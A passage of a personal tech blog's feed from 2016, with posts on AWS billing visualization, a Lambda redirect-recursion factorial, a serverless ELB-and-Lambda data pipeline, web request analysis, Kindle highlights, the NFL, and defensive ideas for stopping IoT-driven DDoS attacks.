  <li><strong><a href="http://dangoldin.com/2015/12/02/think-interfaces-not-implementation/">Focus on interfaces, not implementations</a></strong>. Instead of obsessing over the perfect implementation it’s more important to think about how your application works and the way it’s architected. This way you can always change the implementation of a single method or function to make it better without having to gut and rewrite the entire application.</li>
  <li><strong>For dates and times, just use UTC</strong>. A very common refrain online but only worry about timezones when displaying data to users.</li>
  <li><strong><a href="http://dangoldin.com/2016/08/14/integrating-poorly-documented-open-source-libraries/">Use GitHub for documentation</a></strong>. Sometimes Documentation and StackOverflow don’t have exactly what you need. A good resource is to use GitHub’s code search and find actual examples of the relevant code being used.</li>
</ul>

<h3 id="getting-better-over-time">Getting better over time</h3>
<ul>
  <li><strong><a href="http://dangoldin.com/2014/12/26/devops-for-the-rest-of-us/">Learn to appreciate DevOps</a></strong>. Not many people love DevOps but I’m a strong believer in understanding how your code will run and be deployed. It gets you more familiar with the entire lifecycle and allows you to be more creative with your solutions.</li>
  <li><strong><a href="http://dangoldin.com/2015/10/11/have-a-go-to-project-when-learning-a-new-programming-language/">Have a sample project to learn new languages</a></strong>. In addition to tutorials I like having a project that I will implement in new languages to learn them. This repetition highlights the major differences between the languages and allows me to work on a sample application that mirrors my interests.</li>
  <li><strong><a href="http://dangoldin.com/2016/03/13/approach-work-like-the-gym/">Approach code like you approach the gym</a></strong>. We spend more than 8 hours a day working but imagine if we approached it like we do the gym. Sure people that go to the gym every day without a plan are better off than those who don’t go at all but they pale in comparison to those that go with an agenda. How do we turn every line of code we write into something that’s as focused as a workout?</li>
  <li><strong>Read the classics</strong>. Despite being a relatively young field software engineering has had a ton of great books written and rather than spending time reading blog posts (including this one!) it’s worthwhile to go read the classics.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing your AWS costs</title>
   <link href="http://dangoldin.com/2016/11/27/visualizing-your-aws-costs/"/>
   <updated>2016-11-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/27/visualizing-your-aws-costs</id>
   <content:encoded><![CDATA[
<p>There are a variety of cloud management services that connect to your cloud computing account and analyze your usage in order to offer recommendations that help improve efficiency, security, and reduce your costs. In fact, AWS even provides their own service, <a href="https://aws.amazon.com/premiumsupport/trustedadvisor/">Trusted Advisor</a>, that competes with the external vendors. Unfortunately, these vendors can get expensive quickly. The first useful tier of Trusted Advisor, categorized as Business, has a tiered pricing model based on your existing usage that starts at 10% of your AWS bill and decreases to 3% as you spend past $250k/month. External vendors are cheaper but can still get expensive depending on your bill: <a href="https://www.cloudability.com">Cloudability</a> starts at 1% of your AWS costs which compared to Trusted Advisor is significantly cheaper is still 1% of your AWS bill.</p>

<p>One option is to sign up for a single month and use that to take the necessary steps to improve your cloud configuration. If your infrastructure is stable month to month this is a simple and cheap way to revamp your setup. But if your infrastructure is constantly evolving you need a way to revisit your environment when necessary.</p>

<p>I spent some time looking at our AWS infrastructure last week and it turns out AWS provides an option to export a <a href="https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/detailed-billing-reports.html">detailed billing report</a> to S3 which is what the external vendors use to provide their recommendations. AWS offers a few reporting options but the most detailed one contains every resource and tag and in my case was over a million rows and nearly 500MB. There’s a wealth of information here and I wrote a small script to slice, dice, and visualize the data along a few dimensions to help provide some transparency into what is the biggest cost. The code is extremely simple since it’s just grouping and visualizing the data by different dimensions. The only real enhancement I made was to translate the OpsWorks tags into a layer dimension to make the visualization more useful. The two big things I still need to do are provide recommendations around reserved instance usage and do a better job of grouping the usage types since they’re too specific. As usual the <a href="https://github.com/dangoldin/aws-billing-details-analysis">code is up</a> on GitHub and I’d love to hear any suggestions or feedback. Below are some graphs the script generates but note that I removed the axes labels to avoid revealing our costs and configuration.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/by_product_name.png">
        <img src="http://dangoldin.com/assets/static/images/by_product_name.png" alt="By product name" width="1445" height="467" layout="responsive"/>
      </a>
      <p>
        <strong>By product name.</strong> A simple summary of cost by AWS product/service.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/by_usage_type.png">
        <img src="http://dangoldin.com/assets/static/images/by_usage_type.png" alt="By usage type" width="1433" height="479" layout="responsive"/>
      </a>
      <p>
        <strong>By product name.</strong> This shows every type of usage AWS has in the billing report. To deal with the long tail the script also generates a plot for the top 25 but one thing I need to do is a better job of grouping these - for example data transfer has different values depending on region and type and I want to consolidate them into a one in order to see total costs due to data transfer.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/by_layer_usage_type_top_heatmap.png">
        <img src="http://dangoldin.com/assets/static/images/by_layer_usage_type_top_heatmap.png" alt="By layer and usage type heatmap" width="928" height="566" layout="responsive"/>
      </a>
      <p>
        <strong>By layer and usage type.</strong> To me this is the most interesting one since it's looking at data for multiple dimensions - in this case layer and usage type. The goal here was to see which application/usage pairs result in the largest costs and allow me to prioritize investigation effort. Once again this will be more useful when I do a better job of grouping the usage types.
      </p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Joy of old code</title>
   <link href="http://dangoldin.com/2016/11/19/joy-of-old-code/"/>
   <updated>2016-11-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/19/joy-of-old-code</id>
   <content:encoded><![CDATA[
<p>I have over <a href="https://github.com/dangoldin?tab=repositories">50 repositories</a> on GitHub with the majority being one time projects that were either me exploring a new technology, writing a small script, or doing a quick data analysis and visualization project. Every once in awhile when I’m a bit nostalgic I’ll go through these old projects and mend some of the code.</p>

<p>What’s surprising is discovering old projects and scripts that work as is without me having to do anything to update the underlying code. I’m used to so working with so many open source libraries and cryptic documentation that it’s rare to find a public library that works exactly as you expect. Of course my projects are much simpler than the typical open source library but I find it remarkable that I can get code up and running within a few minutes of a checkout.</p>

<p>This is something that we should aspire to when writing code - writing it in such a way that if someone were to use it in a few years it would be easy to follow and understand while being able to be run without requiring any modification. There’s an urge to constantly improve and extend everything we write but in the world of software it’s possible that we may end up making it worse. Rather than adding bells and whistles to everything we write we should take a step back and think how we would react if we were to discover it in a few years.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Comparing the web requests made by the top sites: 2014 vs 2016</title>
   <link href="http://dangoldin.com/2016/11/18/comparing-the-web-requests-made-by-the-top-sites-2014-vs-2016/"/>
   <updated>2016-11-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/18/comparing-the-web-requests-made-by-the-top-sites-2014-vs-2016</id>
   <content:encoded><![CDATA[
<p>A <a href="http://dangoldin.com/2014/03/09/examining-the-requests-made-by-the-top-100-sites/">few years ago</a> I wrote a simple PhantomJS script to hit the top 100 Alexa domains and track how long it took to load as well as the types of requests it was making. The intent was to try to understand the different factors affecting site speed and how the different sites approached the problem. I rediscovered this script while digging through my old projects this week and thought it would be an interesting analysis to redo this analysis and see how it compared against the data from 2014. The general takeaway is that sites have gotten slower in 2016 compared to 2014 which is likely due to a significant increase in the number of requests they’re making.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-times-mean_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-times-mean_v2.png" alt="Mean times" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Average load time.</strong> Pretty similar to last year with most of the top platform sites being incredibly quick. The surprising thing is that on average sites seem to have gotten slower but this can be entirely due to me having a different internet connection - something that on its own is an issue.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-times-boxplot_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-times-boxplot_v2.png" alt="Time boxplot" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Load time boxplot.</strong> Similar distribution to two years ago but so much more variance. No idea why this would be the case.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-requests-count_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-requests-count_v2.png" alt="Number of requests" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>Number of requests.</strong> Many more requests being made in 2016 than in 2014. In 2014 no site made over 1000 requests but in 2016 we see it happening with 3 sites.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-requests-vs-time_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-requests-vs-time_v2.png" alt="Requests vs time" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Number of request vs time to load.</strong> Expected and similar results to 2014. The more requests a site is making the longer it takes to load.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-file-types-count_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-file-types-count_v2.png" alt="File type frequency" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>File type frequency.</strong> Pretty similar distribution to 2014 but we do see much higher numbers across the board and a relative decrease in JavaScript and an increase in JSON and HTML.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-file-types-url_v2.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-file-types-url_v2.png" alt="File type by url" width="600" height="1000" layout="responsive"/>
      </a>
      <p>
        <strong>File types by url.</strong> Not much here but seems that there's a bit more variety of content types compared to 2014 although still heavily dominated by images.
      </p>
    </div>
  </li>
</ul>

<p>As usual, the code’s up on <a href="https://github.com/dangoldin/site-analysis" target="_blank">GitHub</a> but you’ll need to go back in the revision history to get access to the old data files.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Recursive redirects with AWS Lambda</title>
   <link href="http://dangoldin.com/2016/11/13/recursive-redirects-with-aws-lambda/"/>
   <updated>2016-11-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/13/recursive-redirects-with-aws-lambda</id>
   <content:encoded><![CDATA[
<p>Two years ago I <a href="http://dangoldin.com/2014/12/31/redirect-recursion/">toyed around</a> with an odd idea of implementing recursion over HTTP redirects. The idea is that the state is managed through the query string arguments and at each recursive step we just redirect to the URL for the next one. I still can’t think of a legitimate use case for this approach but have been on an AWS <a href="https://aws.amazon.com/lambda/">Lambda</a> binge lately and wanted to see whether I can get this “redirect recursion” working under Lambda. Turns out it’s incredibly easy.</p>

<p>The only question was exposing the Lambda function to the outside world but AWS offers the <a href="https://aws.amazon.com/api-gateway/">API Gateway</a> service to make this happen. This also gave me a chance to mess around with the API Gateway for the first time and definitely has me thinking about entire tools and applications that can be done in a “serverless” way.</p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="err">#</span> <span class="nx">A</span> <span class="nx">simple</span> <span class="nx">Lambda</span> <span class="kd">function</span> <span class="nx">to</span> <span class="nx">calculate</span> <span class="nx">the</span> <span class="nx">factorial</span>
<span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">exports</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">context</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

    <span class="kd">const</span> <span class="nx">done</span> <span class="o">=</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">statusCode</span><span class="p">:</span> <span class="nx">err</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">400</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">200</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="nx">err</span> <span class="p">?</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">res</span><span class="p">),</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span><span class="p">,</span>
        <span class="p">},</span>
    <span class="p">});</span>

    <span class="k">switch</span> <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">httpMethod</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Calculate the factorial</span>
        <span class="k">case</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">:</span>
            <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">queryStringParameters</span><span class="p">.</span><span class="nx">n</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">1</span><span class="p">;</span>
            <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">queryStringParameters</span><span class="p">.</span><span class="nx">a</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span> <span class="o">||</span> <span class="mi">1</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">done</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="p">{</span><span class="dl">'</span><span class="s1">factorial</span><span class="dl">'</span><span class="p">:</span> <span class="nx">a</span><span class="p">});</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">done</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="p">{</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">try a smaller number</span><span class="dl">'</span><span class="p">});</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">https://rrouzys2ra.execute-api.us-east-1.amazonaws.com/prod/redirect-recursion?</span><span class="dl">'</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">n=</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;a=</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">a</span><span class="o">*</span><span class="nx">n</span><span class="p">);</span>
                <span class="nx">callback</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="p">{</span>
                    <span class="na">statusCode</span><span class="p">:</span> <span class="mi">302</span><span class="p">,</span>
                    <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
                        <span class="dl">'</span><span class="s1">Location</span><span class="dl">'</span><span class="p">:</span> <span class="nx">url</span> <span class="o">+</span> <span class="nx">args</span>
                    <span class="p">}</span>
                <span class="p">});</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="nl">default</span><span class="p">:</span>
            <span class="nx">done</span><span class="p">(</span><span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">`Unsupported method "</span><span class="p">${</span><span class="nx">event</span><span class="p">.</span><span class="nx">httpMethod</span><span class="p">}</span><span class="s2">"`</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">};</span></code></pre></figure>

<p><a href="http://dangoldin.com/assets/static/images/aws-lambda-resource.png"><img src="http://dangoldin.com/assets/static/images/aws-lambda-resource.png" alt="AWS Lambda Resource Setup" width="1491" height="529" layout="responsive"/></a></p>
<p class="caption">This connects any request to the /redirect-recursion endpoint to the Lambda function.</p>

<p><a href="http://dangoldin.com/assets/static/images/aws-lambda-stages.png"><img src="http://dangoldin.com/assets/static/images/aws-lambda-stages.png" alt="AWS Lambda Stage Setup" width="1493" height="587" layout="responsive"/></a></p>
<p class="caption">This shows the URL that needs to be invoked to run the recursion.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>A poor man's data pipeline</title>
   <link href="http://dangoldin.com/2016/11/12/a-poor-mans-data-pipeline/"/>
   <updated>2016-11-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/11/12/a-poor-mans-data-pipeline</id>
   <content:encoded><![CDATA[
<p>Building a data pipeline can be a massive undertaking that typically requires deploying and configuring a Kafka cluster and then building appropriate producers and consumers that themselves come with dozens of configuration options that need to be tweaked to get the best possible performance. Beyond that one has to set up a coordination service, typically ZooKeeper, to handle a litany of concurrency and failure issues. These days having a data pipeline is a requirement for any data driven business but building a true streaming data pipeline entails a ton of dedicated effort.</p>

<p>An idea I’ve been toying with is a “poor man’s data pipeline” that could be built in a serverless way and can scale to massive volumes. It turns out that a pretty simple data pipeline can be built using two AWS services: Elastic Load Balancer (ELB) and Lambda. This data pipeline doesn’t have the true streaming that Kafka provides but for simple aggregations and a tolerable 5 minute delay it’s extremely cheap and robust.</p>

<p>The way it works is by setting up an Elastic Load Balancer with <a href="http://docs.aws.amazon.com/elasticloadbalancing/latest/classic/access-log-collection.html">access logs enabled</a> but not actually associating it with any EC2 instances. Then every time an event is generated it would just be making a request to the ELB with the data specified as query string parameters. Note that this is extremely cheap since at this point we’re not paying for any computer and are just paying for traffic to the load balancer. Note that this is a hack since it will cause every single response to have a 503 status code but can be easily remedied with an simple web service that does no actual processing and responds with a simple 204.</p>

<p>Once we have access logs enabled we set up a Lambda function that gets executed every time a new S3 log file is generated. This lambda function downloads the S3 file and rolls it up via a custom function which can then be setup to export the resulting data wherever it needs to go. Note that at the moment Lambda still has a series of <a href="http://docs.aws.amazon.com/lambda/latest/dg/limits.html">limits</a> that may prevent this from working at incredibly high volumes but even then one can set up Lambda to make a simple HTTP request to an external service with the log file path which can then be processed.</p>

<p>The <a href="https://github.com/dangoldin/poor-mans-data-pipeline">code</a> is short and sweet and is up on GitHub along with a guide on getting started. If you have any questions or suggestions I’d love to hear them.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Restricted highlighting on the Amazon Kindle</title>
   <link href="http://dangoldin.com/2016/11/06/restricted-highlighting-on-the-amazon-kindle/"/>
   <updated>2016-11-06T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/11/06/restricted-highlighting-on-the-amazon-kindle</id>
   <content:encoded><![CDATA[
<p>I love to read so it took me a surprisingly long time to get a Kindle. Before then I felt fine either just grabbing a physical book or using a tablet or a phone. LCD displays never bothered me so I figured I might as well get the responsiveness and additional functionality of a tablet rather than a single-use device. But earlier this year I spent some time using my wife’s Kindle and loved the form factor as well as the battery life. I also started to buy a lot more ebooks so finally took the plunge and got myself a Kindle.</p>

<p>If you’re not an avid reader you can get away with a tablet or phone. But if you enjoy reading the Kindle is great and makes it easy to fall into a reading addiction. I’m a bit odd in that I will refuse to write in a book; I remember having a half dozen SAT practice books and rather than circling the choices I would do it in a separate notebook. I don’t know how this habit stemmed but I won’t do any mutilation of the book, including folding a corner to save a spot. I like to think I value the sanctity of a book but I’m sure it’s due to a habit I picked up as a kid.</p>

<p>With a Kindle I don’t have this aversion and get a kick out of highlighting interesting passages or just words I don’t know. I’m also reviewing the draft of a friend’s book and this made it incredibly easy to take notes. Unfortunately, since the book was a draft and was not purchased through Amazon my highlights aren’t accessible through the website which makes it difficult to actually go through and flesh them out.</p>

<p>This seems like an opportunity for Amazon to improve the experience. It may be an anti-piracy decision which offers an inferior experience to pirated books but this seems misguided and ruins the experience for the majority in order to penalize the minority. Amazon is dominant in ebooks and digital publishing and has already won the space; they should be doing everything they can to encourage authors to write and a big part of that is giving them an easy way to get feedback on their drafts.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The NFL abroad</title>
   <link href="http://dangoldin.com/2016/10/30/the-nfl-abroad/"/>
   <updated>2016-10-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/30/the-nfl-abroad</id>
   <content:encoded><![CDATA[
<p>NFL viewership is <a href="http://www.wsj.com/articles/ratings-fumble-for-nfl-surprises-networks-advertisers-1475764108">down 10%</a> this season and I understand the desire to grow the brand and the sport <a href="https://en.wikipedia.org/wiki/NFL_International_Series#Long-term_deals_and_the_NFL.27s_return_to_Mexico:_2016.E2.80.93present">abroad</a>. It seems misguided to take a product that’s declining in popularity and rather than fixing the core problems to try to grow it as is. This is akin to a tech startup marketing the hell out of a product that’s unable to retain its existing customers. The proper approach is to nail the product before trying to push it into the market.</p>

<p>In this case it’s actually worse since the NFL is not something isolated and the experience of one fan will influence the experience of another. By having some games played internationally the NFL runs the risk of alienating some fans that have to wake up much earlier to watch the game. The London games have been airing at 9:30 AM EST, which is 1:30 PM in London and 6:30 AM in California. This requires the California fan to be up at dawn to watch the game. And on the flipside, imagine a London fan actually adopting an NFL team: an 8:30 PM EST game would start at 12:30 in London and go on for a few hours.</p>

<p>Given the time difference it’s tough to imagine the NFL expanding internationally in its current form.  The only events with this sort of mass appeal are international competitions - the Olympics and the World Cup come to mind - and they occur every 4 years. They should instead focus on attaining the perfect experience for their existing users - that includes making the league more balanced, ditching the blackout rules and embracing full digital distribution, and actually dealing with the concussion and violence issues. Instead it feels as if the NFL is diluting themselves for a small change at some short-lived growth.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Simple data visualizations from the command line</title>
   <link href="http://dangoldin.com/2016/10/26/simple-data-visualizations-from-the-command-line/"/>
   <updated>2016-10-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/26/simple-data-visualizations-from-the-command-line</id>
   <content:encoded><![CDATA[
<p>Lately I’ve been doing a variety of quick data investigations and they typically follow the same formula: write a query to fetch some simple data, copy and paste into Excel, do a minimal amount of manipulation, plot the results. Often this happens in a sequence where the results of one analysis leads to another one and so forth and so forth until the data has been sliced so many different ways that I’m able to figure out what I was investigating.</p>

<p>Earlier today I did yet another one of these analysis and got annoyed by how repetitive the process was and wrote a quick script to handle simplest case: a single line chart derived from two columns - each representing an axis. The script works by taking tab delimited data via stdin and then using matplotlib to do a standard line chart. There’s a ton of room for improvement but it fits my standard workflow of using <a href="http://www.sql-workbench.net/">SQL Workbench/J</a> to execute the query and then quickly copy it over to my clipboard in a tab delimited format.</p>

<p>The <a href="https://github.com/dangoldin/python-tools/blob/master/plotter.py">code is up on GitHub</a> and it can be executed from the command line by piping the raw data directly into the script. If the data is in the clipboard it’s as simple as typing in “pbpaste | ./plotter.py”. Using this approach I was able to generate the image below as well as the Excel version for comparison. The major improvements are cleaning up the styling so it looks nicer as well as supporting multiple series.</p>

<img src="http://dangoldin.com/assets/static/images/sample-plot-plotter.png" alt="Sample plot using the plotter" width="1108" height="762" layout="responsive"/>

<img src="http://dangoldin.com/assets/static/images/sample-plot-excel.png" alt="Sample plot using Excel" width="900" height="518" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Preventing future DDOS attacks</title>
   <link href="http://dangoldin.com/2016/10/23/preventing-future-ddos-attacks/"/>
   <updated>2016-10-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/23/preventing-future-ddos-attacks</id>
   <content:encoded><![CDATA[
<p>After Friday’s DNS DDOS attack I’ve been thinking of approaches that could prevent this from happening in the future. In a perfect world every device would be up to date with the latest updates and it would be difficult to compromise anything that’s connected to the internet. Unfortunately, this is not the case and there’s an ever growing number of devices that are quickly hacked together and sold without any focus placed on security. Akamai did a <a href="https://www.wired.com/2016/10/akamai-finds-longtime-security-flaw-2-million-devices/">study that shows</a> over 2 million internet connected devices have been compromised which allows them to be used to run DDOS attacks, very similar to the one that took down a big chunk of the internet on Friday. The challenge is that most owners both don’t know and don’t bother to do any security audits when setting up these devices and very likely never upgrade the firmware nor the software to make them more secure.</p>

<p>The solution is either to have much stronger regulation on what’s able to be sold to force manufacturers to secure their devices but I suspect this is a non starter - it’s tough to control the global world and there will always be incentives to deviate. A better solution would be one that assumes the internet will be filled with these malicious devices but can still handle them.</p>

<p>One idea is to make our routers smarter. They’re our homes’ gateway to the internet and improving the way they handle outbound traffic can reduce the impact these faulty devices have. Imagine them being smart enough to know the typical pattern of every connected device and throttle atypical traffic. Or have them serve as a both a cache and a throttler of DNS requests. The risk here is that the router itself becomes compromised or ends up accidentally rejecting valid traffic. I suspect most people have a router that was given to them by their ISP and ISPs have a strong incentive to keep their routers secure. And even if the router does get compromised we can push this sort of “smart throttling” unto the ISPs. In the case of the accidental throttling we’ll either need to deal with a small delay or provide the ability for a human to override the throttling - something that they would not unknowingly do to support a random device.</p>

<p>The solution here is to accept that we will always have bad actors and that we’ll never have total security. In that sort of world the network itself needs to be robust and resilient enough to handle whatever is thrown it’s way. Making the network more intelligent is one way but other ways include building in more resiliency into the protocol itself or making more and more of the internet distributed. This problem will only get worse as our entire homes connect to the internet and we need to find a solution before then.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Revisiting my Twitter activity</title>
   <link href="http://dangoldin.com/2016/10/19/revisiting-my-twitter-activity/"/>
   <updated>2016-10-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/19/revisiting-my-twitter-activity</id>
   <content:encoded><![CDATA[
<p>While going through my old GitHub repos I discovered that the most starred repo was <a href="https://github.com/dangoldin/twitter-archive-analysis">twitter-archive-analysis</a>, a Python script that would generate a view visualizations of a Twitter archive. I haven’t touched the code in over 3 years and decided to see how it was holding up and whether any of it still worked. After a few false starts getting the necessary packages playing nicely together and updating the code to support Twitter’s new archive format, I was able to get the old code working. Compared to three years ago, the results are surprisingly not that different - I definitely tweet less frequently than I used to and my activity has shifted into being more about replies rather than general tweets.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-hour-2016.png" alt="Tweets sent by hour" width="800" height="600" layout="responsive"/>
      <p>No tweets while I'm asleep but tend to be the most active in the evenings.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-dow-2016.png" alt="Tweets sent by day of week" width="800" height="600" layout="responsive"/>
      <p>Pretty even distribution but more active on the weekends than the weekdays.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-2016.png" alt="Tweets sent by month" width="800" height="600" layout="responsive"/>
      <p>Hit my peak in 2013 and have been declining since.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-dow-2016.png" alt="Tweets sent by month and day of week" width="800" height="600" layout="responsive"/>
      <p>I tried to get at the idea of how much I tweet over time and by day - the weekends have remianed steady but my weekday tweeting has dropped off.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-length-2016.png" alt="Average length of a tweet by month" width="800" height="600" layout="responsive"/>
      <p>Definitely not taking advantage of the full 140 characters.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-type-2016.png" alt="Type of tweet sent by month" width="1200" height="600" layout="responsive"/>
      <p>The next visualization provides a much better idea of my tweet type distribution.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/by-month-type-stacked-2016.png" alt="Type of tweet sent by month - normalized" width="800" height="600" layout="responsive"/>
      <p>A clear trend to being more about replies and engagement rather than just posting thoughts and ideas.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My new blogging setup</title>
   <link href="http://dangoldin.com/2016/10/13/my-new-blogging-setup/"/>
   <updated>2016-10-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/13/my-new-blogging-setup</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/lapdesk-blogging.jpg" alt="My lapdesk, keyboard, and phone setup" width="350" height="467"/>
</div>

<p>The past couple of weeks I’ve had a big case of writer’s block. I haven’t been able to motivate myself to write as much as I used to and when I did get to write it felt more like a chore than a joy. I didn’t know how to break out of it but this past weekend I kicked off the OS X upgrade without realizing how much time it would take.</p>

<p>Since I made a commitment to write two posts a week and I was computerless I had to do something. Lucky for me I have an bluetooth keyboard lying around a neat lap desk with a phone slot so I decided to give it a shot and see what I could muster.</p>

<p>It turned out remarkably well. The small screen made it a lot easier to focus which was magnified by the inability to easy switch to another app - something I’m prone to doing when I’m on an actual computer.</p>

<p>I still need the command line to commit the text and handle the image upload but it was incredibly liberating to write using a keyboard, a lap desk, and a phone. The change of environment itself may have gotten me over the writer’s block but I can also see myself using this setup whenever I travel or am outside. It’s also portable which makes it simple to write where I am.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Setting up secor for Kafka 0.10</title>
   <link href="http://dangoldin.com/2016/10/10/setting-up-secor-for-kafka-010/"/>
   <updated>2016-10-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2016/10/10/setting-up-secor-for-kafka-010</id>
   <content:encoded><![CDATA[
